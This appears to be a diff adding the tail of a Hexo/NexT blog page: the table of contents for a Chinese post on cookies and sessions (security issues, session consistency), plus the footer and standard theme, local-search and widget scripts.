+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#为什么要有cookie-session"><span class="nav-number">1.</span> <span class="nav-text">为什么要有cookie/session?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cookie"><span class="nav-number">2.</span> <span class="nav-text">cookie</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#cookie是什么"><span class="nav-number">2.1.</span> <span class="nav-text">cookie是什么</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#主要特性"><span class="nav-number">2.2.</span> <span class="nav-text">主要特性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#安全性问题"><span class="nav-number">2.3.</span> <span class="nav-text">安全性问题</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#网络窃听"><span class="nav-number">2.3.1.</span> <span class="nav-text">网络窃听</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#DNS缓存中毒"><span class="nav-number">2.3.2.</span> <span class="nav-text">DNS缓存中毒</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#跨站点脚本XSS"><span class="nav-number">2.3.3.</span> <span class="nav-text">跨站点脚本XSS</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#跨站请求伪造CSRF"><span class="nav-number">2.3.4.</span> <span class="nav-text">跨站请求伪造CSRF</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#session"><span class="nav-number">3.</span> <span class="nav-text">session</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#session是什么"><span class="nav-number">3.1.</span> <span class="nav-text">session是什么</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#主要特性-1"><span class="nav-number">3.2.</span> <span class="nav-text">主要特性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#一致性问题"><span class="nav-number">3.3.</span> <span class="nav-text">一致性问题</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#session复制（同步）"><span class="nav-number">3.3.1.</span> <span class="nav-text">session复制（同步）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#客户端存储法"><span class="nav-number">3.3.2.</span> <span class="nav-text">客户端存储法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#反向代理hash一致性"><span class="nav-number">3.3.3.</span> <span class="nav-text">反向代理hash一致性</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#后端统一集中存储"><span class="nav-number">3.3.4.</span> <span class="nav-text">后端统一集中存储</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#总结"><span class="nav-number">3.3.5.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-snowflake-o"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">All rights reserved @JieSunn</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共字</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=7.0.1"></script>
+
+  <script src="/js/src/motion.js?v=7.0.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=7.0.1"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=7.0.1"></script>
+
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
+<script src="/js/src/post-details.js?v=7.0.1"></script>
+
+
+
+  
+
+
+  <script src="/js/src/next-boot.js?v=7.0.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":true},"log":false});</script></body>
+</html>
